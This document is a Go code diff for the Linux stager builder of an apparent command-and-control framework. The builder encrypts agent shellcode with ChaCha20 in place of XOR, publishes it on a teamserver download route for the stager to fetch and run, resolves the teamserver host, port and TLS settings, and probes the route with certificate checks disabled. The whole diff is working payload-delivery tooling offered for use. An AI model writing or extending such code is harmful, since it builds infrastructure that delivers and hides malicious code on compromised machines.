@@ -2,8 +2,10 @@ package main
 
 import (
 	crand "crypto/rand"
+	"crypto/tls"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
 	"os"
@@ -38,14 +40,36 @@ var (
 		return "/api"
 	}()
 
+	// Same contract as the Windows stager.  The /s/:token route belongs to the
+	// teamserver's own HTTP endpoint, so an unset port means "unresolved" (0) and
+	// generation fails loudly.  The old 8080 default named an agent listener, and
+	// the stager then spoke TLS to a plaintext port and died on the target
+	// without leaving a single server-side trace.
 	linuxStagerTSPort = func() int {
 		if v := strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_PORT")); v != "" {
 			if n, err := strconv.Atoi(v); err == nil && n > 0 {
 				return n
 			}
 		}
-		return 8080
+		return 0
 	}()
+
+	// TLS is the default because the web endpoint is TLS whenever the profile
+	// carries cert/key, which tls_autogen guarantees; an explicit
+	// ADAPTIX_TEAMSERVER_SSL=0 selects a plaintext endpoint.  This used to be a
+	// hardcoded `true`, which silently disagreed with any plaintext deployment.
+	linuxStagerTSSSL = func() bool {
+		switch strings.ToLower(strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_SSL"))) {
+		case "0", "false", "no", "off":
+			return false
+		}
+		return true
+	}()
+
+	// External address of the teamserver endpoint.  Empty means "reuse the
+	// listener's callback address", which is right when the listener and the
+	// teamserver are the same host -- the usual case.
+	linuxStagerTSHost = strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_HOST"))
 )
 
 func linuxStagerDir() string {
@@ -177,12 +201,15 @@ func linuxStagerRandomKey(n int) ([]byte, error) {
 	return b, nil
 }
 
-func linuxStagerXor(data, key []byte) []byte {
-	out := make([]byte, len(data))
-	for i := range data {
-		out[i] = data[i] ^ key[i%len(key)]
+func linuxStagerChaCha(data, key []byte) []byte {
+	// Deterministic nonce derived from the per-payload random key.
+	// The key is never reused across payloads, so nonce reuse is
+	// impossible by construction.
+	nonce := make([]byte, 12)
+	for i := 0; i < 12; i++ {
+		nonce[i] = key[i] ^ 0x5A
 	}
-	return out
+	return chacha20Xor(key, nonce, data)
 }
 
 func linuxStagerKeyCLiteral(key []byte) string {
@@ -207,30 +234,128 @@ func linuxStagerPublish(token string, blob []byte) (string, error) {
 	return linuxStagerHTTPEndpoint + "/s/" + token, nil
 }
 
-func linuxStagerResolveHost(listenerMap map[string]any) (host string, port int, useSSL bool, err error) {
-	host = "127.0.0.1"
-	port = linuxStagerTSPort
-	useSSL = true
-	if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
-		for _, iLine := range lines {
-			line, _ := iLine.(string)
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-			h, _, e := net.SplitHostPort(line)
-			if e != nil {
-				host = line
-			} else if h != "" {
-				host = h
-			}
-			break
-		}
+func linuxStagerResolveHost(listenerMap map[string]any, cfg GenerateConfig) (host string, port int, useSSL bool, err error) {
+	// 取值优先级（三档，与 beacon_agent/pl_stager.go 保持**同序**）：
+	//   1. agent_params —— 控制台「生成载荷」表单里填的。**主路径**：所有操作员都在
+	//      WebUI 上操作，这是唯一一处他们能自己改的地方。
+	//   2. 进程环境变量 —— 回退，由 build_deploy.sh --up 按真正加载的 profile 注入。
+	//   3. 监听器的 callback_addresses —— 只兜底 host。
+	// 全都缺 ⇒ 下面硬报错。绝不静默回落 8080：那是 agent 监听器。
+	port = cfg.StagerTSPort
+	if port <= 0 {
+		port = linuxStagerTSPort
+	}
+	useSSL = linuxStagerTSSSL
+	if cfg.StagerTSSSL != nil {
+		useSSL = *cfg.StagerTSSSL
+	}
+
+	host = strings.TrimSpace(cfg.StagerTSHost)
+	if host == "" {
+		host = linuxStagerTSHost
 	}
 	if host == "" {
-		return "", 0, false, fmt.Errorf("empty stager host")
+		if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
+			for _, iLine := range lines {
+				line, _ := iLine.(string)
+				line = strings.TrimSpace(line)
+				if line == "" {
+					continue
+				}
+				h, _, e := net.SplitHostPort(line)
+				if e != nil {
+					host = line
+				} else if h != "" {
+					host = h
+				}
+				break
+			}
+		}
+	}
+
+	// Both of these used to fall back silently ("127.0.0.1", 8080), producing a
+	// URL that pointed at an agent listener or at the wrong host entirely.  Say
+	// what is missing instead of shipping a payload that can only fail.
+	if port <= 0 {
+		return "", 0, false, fmt.Errorf(
+			"teamserver endpoint port is not configured: fill in the stager download endpoint on the generate form (Stager TS port), or set ADAPTIX_TEAMSERVER_PORT to Teamserver.port from the profile -- the %s route the stager downloads from is served by the teamserver itself, not by the agent listener",
+			linuxStagerHTTPEndpoint+"/s/:token")
+	}
+	if host == "" {
+		return "", 0, false, fmt.Errorf("cannot resolve a stager download host: fill in the stager download endpoint on the generate form (Stager TS host), set ADAPTIX_TEAMSERVER_HOST, or give the listener a callback_address")
 	}
 	return host, port, useSSL, nil
+}
+
+// linuxStagerVerifyRoute mirrors the Windows stager's build-time probe: ask the
+// endpoint for a token that cannot exist.  linuxStagerServeHandler answers
+// unknown tokens with 404, so a 404 proves the port, scheme and endpoint about to
+// be embedded really do reach this plugin's /s/:token route.  The opposite scheme
+// is tried on loopback only, because if the route answers there the mistake is
+// ADAPTIX_TEAMSERVER_SSL rather than the port.
+//
+// Being unreachable is only a warning: the host embedded in the stager is its
+// external address, which the teamserver itself may not be able to dial.
+func linuxStagerVerifyRoute(builderId string, host string, port int, useSSL bool) error {
+	schemeOf := func(ssl bool) string {
+		if ssl {
+			return "https"
+		}
+		return "http"
+	}
+	urlPath := linuxStagerHTTPEndpoint + "/s/000000000000000000000000"
+
+	client := &http.Client{
+		Timeout: 3 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	targets := []struct {
+		addr    string
+		schemes []bool
+	}{
+		{net.JoinHostPort("127.0.0.1", strconv.Itoa(port)), []bool{useSSL, !useSSL}},
+		{net.JoinHostPort(host, strconv.Itoa(port)), []bool{useSSL}},
+	}
+
+	connected := false
+	var lastErr error
+	var lastStatus string
+
+	for _, target := range targets {
+		for i, ssl := range target.schemes {
+			url := schemeOf(ssl) + "://" + target.addr + urlPath
+			resp, err := client.Get(url)
+			if err != nil {
+				lastErr = err
+				continue
+			}
+			connected = true
+			_, _ = io.Copy(io.Discard, resp.Body)
+			_ = resp.Body.Close()
+
+			if resp.StatusCode == http.StatusNotFound {
+				if i == 0 {
+					return nil
+				}
+				want := "0"
+				if ssl {
+					want = "1"
+				}
+				return fmt.Errorf("the %s route answers over %s but not over the configured %s: set ADAPTIX_TEAMSERVER_SSL=%s", urlPath, schemeOf(ssl), schemeOf(useSSL), want)
+			}
+			lastStatus = fmt.Sprintf("%s returned HTTP %d", url, resp.StatusCode)
+		}
+	}
+
+	if !connected {
+		_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO,
+			fmt.Sprintf("WARNING: could not verify the stager download URL from this host (%v) -- confirm %s://%s:%d%s is reachable from the target", lastErr, schemeOf(useSSL), host, port, urlPath))
+		return nil
+	}
+	return fmt.Errorf("stager download URL does not reach the /s/:token route (%s); check ADAPTIX_TEAMSERVER_PORT and ADAPTIX_ENDPOINT against the Teamserver section of the profile", lastStatus)
 }
 
 func linuxStagerFindTemplate(moduleDir string) (string, error) {
@@ -245,13 +370,16 @@ func linuxStagerFindTemplate(moduleDir string) (string, error) {
 	return "", fmt.Errorf("stager_linux.c not found under %s", moduleDir)
 }
 
-func buildLinuxStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string) ([]byte, string, error) {
+func buildLinuxStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string, cfg GenerateConfig) ([]byte, string, error) {
 	if len(shellcode) == 0 {
 		return nil, "", fmt.Errorf("empty shellcode for linux stager")
 	}
 
-	host, port, useSSL, err := linuxStagerResolveHost(listenerMap)
+	host, port, useSSL, err := linuxStagerResolveHost(listenerMap, cfg)
 	if err != nil {
+		return nil, "", err
+	}
+	if err := linuxStagerVerifyRoute(builderId, host, port, useSSL); err != nil {
 		return nil, "", err
 	}
 	key, err := linuxStagerRandomKey(16)
@@ -263,7 +391,7 @@ func buildLinuxStager(builderId string, moduleDir string, tempDir string, shellc
 		return nil, "", err
 	}
 
-	enc := linuxStagerXor(shellcode, key)
+	enc := linuxStagerChaCha(shellcode, key)
 	absPath, err := linuxStagerPublish(token, enc)
 	if err != nil {
 		return nil, "", err
